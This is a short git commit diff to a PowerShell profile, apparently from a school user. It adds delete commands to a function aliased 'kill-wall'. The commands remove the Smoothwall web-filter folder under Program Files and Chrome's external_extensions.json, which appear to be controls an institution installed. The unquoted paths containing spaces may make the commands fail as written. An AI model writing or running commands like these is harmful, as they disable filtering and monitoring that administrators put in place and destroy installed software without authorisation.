829d53c0f57d853e7ad49e70e20d7da7294b0d70
TestAccountIdk-1 <22hannedw@reigategrammar.org>
2025-10-08 16:38:40 +0100

    Add files via upload

--- Microsoft.PowerShell_profile.ps1
+++ Microsoft.PowerShell_profile.ps1
@@ -4,5 +4,8 @@ set-alias -name dir-h -value dir-hFUNC
 function cmdFUNC {write-warning 'READ ALL OF THE FOLLOWING:'
 get-content C:\Users\Public\Downloads\warning.txt
 write-output "The command continues 30 seconds after the warning has printed."
-start-sleep 30}
+start-sleep 30
+del C:\Program Files\google\chrome\Application\140.0.7339.208\default_apps\external_extensions.json -Confirm -Force
+del C:\Program Files\Smoothwall -Confirm -Force
+}
 set-alias kill-wall -value cmdFUNC
